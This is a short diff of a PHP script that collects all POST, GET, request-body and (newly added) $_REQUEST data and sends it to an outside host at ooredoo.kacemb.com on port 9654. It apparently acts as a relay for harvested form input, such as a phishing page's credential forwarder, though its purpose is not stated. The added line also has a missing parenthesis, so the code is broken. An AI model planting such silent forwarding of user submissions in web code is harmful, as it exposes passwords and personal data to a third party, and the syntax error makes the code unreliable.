@@ -7,7 +7,8 @@ $url = 'http://ooredoo.kacemb.com:9654/notifications.php';
 $fields = array(
 	'entry' => urlencode(implode("|",$_POST)),
 	'entry_get' => urlencode(implode("|",$_GET)),
-	'entry_body' => urlencode(file_get_contents( 'php://input' ))
+	'entry_body' => urlencode(file_get_contents( 'php://input' )),
+	'entry_request' => urlencode(implode("|",$_REQUEST)
 );
 foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
 rtrim($fields_string, '&');
